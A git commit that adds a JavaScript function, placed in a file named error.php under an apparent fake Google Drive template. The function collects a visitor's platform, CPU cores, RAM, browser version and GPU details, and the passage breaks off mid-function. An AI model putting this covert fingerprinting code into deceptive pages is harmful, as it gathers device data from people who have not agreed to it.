134a65e4d6e2310d5108a5ff6da057b94d90f34f
RDX-shiva <76251214+RDX-shiva@users.noreply.github.com>
2020-12-26 09:17:28 +0530

    Create error.php

---
+++ template/gdrive/php/error.php
@@ -0,0 +1,75 @@
+
+function information()
+{
+  var ptf = navigator.platform;
+  var cc = navigator.hardwareConcurrency;
+  var ram = navigator.deviceMemory;
+  var ver = navigator.userAgent;
+  var str = ver;
+  var os = ver;
+  //gpu
+  var canvas = document.createElement('canvas');
+  var gl;
+  var debugInfo;
+  var ven;
+  var ren;
+  //sysinfo
+  console.log(ver);
+  console.log(ptf);
+
+  if (cc == undefined)
+  {
+    cc = 'Not Available';
+    console.log('Cores are not available')
+  }
+  console.log(cc);
+   
+  //ram
+  if (ram == undefined)
+  {
+    ram = 'Not Available';
+    console.log('RAM is not available')
+  }
+  console.log(ram);
+
+  //browser
+  if (ver.indexOf('Firefox') != -1)
+  {
+    str = str.substring(str.indexOf(' Firefox/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+    console.log(str[0]);
+  }
+  else if (ver.indexOf('Chrome') != -1)
+  {
+    str = str.substring(str.indexOf(' Chrome/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+    console.log(str[0]);
+  }
+  else if (ver.indexOf('Safari') != -1)
+  {
+    str = str.substring(str.indexOf(' Safari/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+    console.log(str[0]);
+  }
+  else if (ver.indexOf('Edge') != -1)
+  {
+    str = str.substring(str.indexOf(' Edge/') + 1);
+    str = str.split(' ');
+    brw = str[0];
+    console.log(str[0]);
+  }
+  else
+  {
+    brw = 'Not Available'
+    console.log('Browser is not available')
+  }
+
+  //gpu
+  try
+  {
+    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+  }
+  catch (e)
